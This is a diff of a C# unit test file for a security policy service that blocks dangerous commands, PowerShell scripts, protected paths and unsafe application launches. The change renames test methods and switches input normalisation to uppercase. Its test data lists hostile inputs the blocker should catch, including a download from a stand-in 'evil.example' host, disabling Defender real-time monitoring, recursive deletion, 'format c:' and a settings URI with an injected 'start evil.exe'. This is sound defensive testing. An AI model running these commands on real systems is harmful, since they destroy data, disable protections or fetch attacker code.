@@ -20,9 +20,10 @@ public sealed class SecurityPolicyTests
     [InlineData("takeown /f C:\\windows")]
     [InlineData("sc delete wuauserv")]
     [InlineData("sc stop bits")]
-    public void IsCommandBlocked_BlocksDestructivePatterns(string command)
+    public void IsCommandBlockedBlocksDestructivePatterns(string command)
     {
-        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(command);
+        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
     }
 
     [Theory]
@@ -30,9 +31,10 @@ public sealed class SecurityPolicyTests
     [InlineData("cleanmgr /verylowdisk")]
     [InlineData("ping 1.1.1.1")]
     [InlineData("msiexec.exe /x {11111111-2222-3333-4444-555555555555}")]
-    public void IsCommandBlocked_AllowsNormalCommands(string command)
+    public void IsCommandBlockedAllowsNormalCommands(string command)
     {
-        Assert.False(new SecurityPolicyService().IsCommandBlocked(command.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(command);
+        Assert.False(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
     }
 
     [Theory]
@@ -41,9 +43,10 @@ public sealed class SecurityPolicyTests
     [InlineData("Invoke-WebRequest http://evil.example/x.ps1")]
     [InlineData("Remove-Item -Recurse C:\\Users")]
     [InlineData("Set-MpPreference -DisableRealtimeMonitoring $true")]
-    public void IsPowerShellBlocked_BlocksDangerousPatterns(string script)
+    public void IsPowerShellBlockedBlocksDangerousPatterns(string script)
     {
-        Assert.True(new SecurityPolicyService().IsPowerShellBlocked(script.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(script);
+        Assert.True(new SecurityPolicyService().IsPowerShellBlocked(script.ToUpperInvariant()));
     }
 
     [Theory]
@@ -54,30 +57,32 @@ public sealed class SecurityPolicyTests
     [InlineData(@"C:\System Volume Information\tracking.log")]
     [InlineData(@"D:\$RECYCLE.BIN\x")]
     [InlineData(@"C:\EFI\boot\bootx64.efi")]
-    public void IsProtectedPath_ProtectsSystemTrees(string path)
+    public void IsProtectedPathProtectsSystemTrees(string path)
     {
-        Assert.True(new SecurityPolicyService().IsProtectedPath(path.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(path);
+        Assert.True(new SecurityPolicyService().IsProtectedPath(path.ToUpperInvariant()));
     }
 
     [Theory]
     [InlineData(@"C:\Users\x\AppData\Local\Temp\cleanup.exe")]
     [InlineData(@"D:\Games\game.exe")]
-    public void IsProtectedPath_AllowsUserPaths(string path)
+    public void IsProtectedPathAllowsUserPaths(string path)
     {
-        Assert.False(new SecurityPolicyService().IsProtectedPath(path.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(path);
+        Assert.False(new SecurityPolicyService().IsProtectedPath(path.ToUpperInvariant()));
     }
 
     [Theory]
     [InlineData("")]
     [InlineData("   ")]
     [InlineData(null)]
-    public void IsApplicationAllowed_EmptyName_ReturnsFalse(string? appName)
+    public void IsApplicationAllowedEmptyNameReturnsFalse(string? appName)
     {
         Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName!, out _));
     }
 
     [Fact]
-    public void IsApplicationAllowed_BlockedCommand_ReturnsFalse()
+    public void IsApplicationAllowedBlockedCommandReturnsFalse()
     {
         Assert.False(new SecurityPolicyService().IsApplicationAllowed("format.com", out _));
     }
@@ -88,7 +93,7 @@ public sealed class SecurityPolicyTests
     [InlineData("ms-settings:privacy-microphone", true)]
     [InlineData("ms-settings:appsfeatures; start evil.exe", false)]
     [InlineData("ms-settings:apps features", false)]
-    public void IsApplicationAllowed_SettingsUri_ValidatedBySuffix(string target, bool expected)
+    public void IsApplicationAllowedSettingsUriValidatedBySuffix(string target, bool expected)
     {
         Assert.Equal(expected, new SecurityPolicyService().IsApplicationAllowed(target, out _));
     }
@@ -100,13 +105,13 @@ public sealed class SecurityPolicyTests
     [InlineData("taskmgr")]
     [InlineData("powershell")]
     [InlineData("cleanmgr.exe")]
-    public void IsApplicationAllowed_StandardSystemApps_AreAllowed(string appName)
+    public void IsApplicationAllowedStandardSystemAppsAreAllowed(string appName)
     {
         Assert.True(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
     }
 
     [Fact]
-    public void IsApplicationAllowed_ExeOutsideApprovedLocations_IsRefused()
+    public void IsApplicationAllowedExeOutsideApprovedLocationsIsRefused()
     {
         string exe = Path.Join(Path.GetTempPath(), "untrusted_policy_test.exe");
         File.WriteAllText(exe, "stub");
@@ -122,7 +127,7 @@ public sealed class SecurityPolicyTests
     }
 
     [Fact]
-    public void IsApplicationAllowed_NonExeFile_IsRefused()
+    public void IsApplicationAllowedNonExeFileIsRefused()
     {
         string file = Path.Join(Path.GetTempPath(), "policy_test.txt");
         File.WriteAllText(file, "data");
@@ -140,7 +145,7 @@ public sealed class SecurityPolicyTests
     [Theory]
     [InlineData("randomappthatdoesnotexist")]
     [InlineData("C:\\does\\not\\exist.exe")]
-    public void IsApplicationAllowed_UnknownName_IsRefused(string appName)
+    public void IsApplicationAllowedUnknownNameIsRefused(string appName)
     {
         Assert.False(new SecurityPolicyService().IsApplicationAllowed(appName, out _));
     }
@@ -151,19 +156,20 @@ public sealed class SecurityPolicyTests
     [InlineData("rm -rf   /")]
     [InlineData("net   user  test pass")]
     [InlineData("format  c:")]
-    public void IsCommandBlocked_ResistsSpacingVariations(string command)
+    public void IsCommandBlockedResistsSpacingVariations(string command)
     {
-        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToLowerInvariant()));
+        ArgumentNullException.ThrowIfNull(command);
+        Assert.True(new SecurityPolicyService().IsCommandBlocked(command.ToUpperInvariant()));
     }
 
     [Fact]
-    public void IsCommandBlocked_EmptyCommand_IsAllowed()
+    public void IsCommandBlockedEmptyCommandIsAllowed()
     {
         Assert.False(new SecurityPolicyService().IsCommandBlocked(string.Empty));
     }
 
     [Fact]
-    public void IsCommandBlocked_NullCommand_IsAllowed()
+    public void IsCommandBlockedNullCommandIsAllowed()
     {
         Assert.False(new SecurityPolicyService().IsCommandBlocked(null!));
     }
